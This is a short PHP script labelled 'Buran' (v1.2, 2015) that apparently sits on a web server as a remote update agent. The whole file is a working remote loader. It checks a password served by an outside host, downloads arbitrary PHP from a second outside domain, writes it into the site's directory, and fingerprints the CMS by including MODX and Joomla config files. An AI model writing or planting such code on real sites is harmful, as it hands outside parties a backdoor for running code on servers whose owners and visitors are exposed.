<?php
// Buran_004
// scorN - v.1.2
// 26.10.2015
// Буран
//====================================================================================================
	error_reporting(-1);            
//====================================================================================================
	$root= $_SERVER[ 'DOCUMENT_ROOT' ];
	$host= str_replace( "www.", "", $_SERVER[ 'HTTP_HOST' ] );
	
	$act= $_GET[ 'act' ];
	
	$ww= @file_get_contents( "http://fndelta.gavrishkin.ru/__password__002.php?host=". $host ."&w=". $_GET[ 'w' ] );
	if( ! $ww || $_GET[ 'w' ] == '' || $_GET[ 'w' ] != $ww ) exit();
//====================================================================================================


if( isset( $_GET[ 'fromf' ] ) ) $fromf= addslashes( trim( urldecode( $_GET[ 'fromf' ] ) ) ); else $fromf= '';
if( isset( $_GET[ 'tof' ] ) ) $tof= addslashes( trim( urldecode( $_GET[ 'tof' ] ) ) ); else $tof= '';
$fromf= str_replace( "/", "", $fromf );
$fromf= str_replace( chr( 0 ), "", $fromf );
$tof= str_replace( "/", "", $tof );
$tof= str_replace( chr( 0 ), "", $tof );
if( $act == 'update' && $fromf != '' && $tof != '' )
{
	$opts= array(
		'http' => array(
			'method' => "GET",
			'header' => "Content-Type: text/html; charset=utf-8"
		)
	);
	$context= stream_context_create( $opts );
	
	if( $context )
	{
		$file_get_contents= @file_get_contents( 'http://bunker-yug.ru/__buran/update/'. $fromf, false, $context );
		if( $file_get_contents && substr( $file_get_contents, 0, 5 ) == '<?php' )
		{
			$ff= @fopen( $root .'/_buran/'. $tof, 'w' );
			if( $ff )
			{
				$fwrite_res= @fwrite( $ff, $file_get_contents );
				if( $fwrite_res )
				{
					print "[[OK]]\n";
				}else{
					print "[[ERROR01]]\n";
				}
				print $host ."\n";
				@fclose( $ff );
			}
		}else{
			print "[[ERROR02]]\n";
			print $host ."\n";
		}
	}
	
	$cms= cms();
	if( $cms[ 0 ] == 'modx_evo' ) print "[[MODX_". $cms[ 2 ] ."]]\n";
	if( $cms[ 0 ] == 'joomla' ) print "[[JOOMLA]]\n";
}

function cms()
{
	//v003
	global $root;
	
	@include( $root .'/manager/includes/version.inc.php' );
	if( ! empty( $modx_full_appname ) )
	{
		$cms= 'modx_evo';
		$cmsname= $modx_full_appname;
		$cmsver= $modx_version;
	}
	@include( $root .'/configuration.php' );
	if( class_exists( 'JConfig' ) ) $conf= new JConfig();
	if( $conf->host )
	{
		$cms= 'joomla';
		$cmsname= '';
		$cmsver= '';
	}
	
	return array( $cms, $cmsname, $cmsver );
}